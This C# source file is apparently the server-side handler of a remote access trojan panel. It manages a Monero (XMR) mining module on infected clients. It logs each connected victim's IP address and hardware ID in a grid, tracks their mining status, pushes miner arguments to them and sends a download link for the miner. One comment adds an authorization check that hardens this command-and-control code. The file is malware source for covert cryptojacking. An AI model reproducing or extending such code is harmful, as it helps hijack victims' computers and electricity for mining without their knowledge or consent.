using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerMinerXmr
{
	public static void Read(Clients clients, object[] array)
	{
		switch ((string)array[1])
		{
		case "Connect":
			if (Program.form.MinerXMR.work)
			{
				clients.Hwid = (string)array[2];
				DataGridViewRow Item = new DataGridViewRow();
				Item.Tag = clients;
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.IP
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.Hwid
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "dont mining"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[3]
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[4]
				});
				clients.Tag = Item;
				Program.form.MinerXMR.Invoke((MethodInvoker)delegate
				{
					Program.form.MinerXMR.GridClients.Rows.Add(Item);
					if (Program.form.MinerXMR.materialSwitch7.Checked)
					{
						clients.Send(Program.form.MinerXMR.Args());
					}
				});
			}
			else
			{
				clients.Disconnect();
			}
			break;
		case "Status":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerXMR.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
			});
			break;
		case "GetLink":
            // Authorization check: Only allow if client is properly identified (e.g., HWID is set)
            if (string.IsNullOrEmpty(clients.Hwid))
            {
                clients.Disconnect(); // Disconnect unauthorized client
                return;
            }
			clients.Send(new object[2]
			{
				"Link",
				Program.form.settings.linkMiner
			});
			break;
		}
	}
}


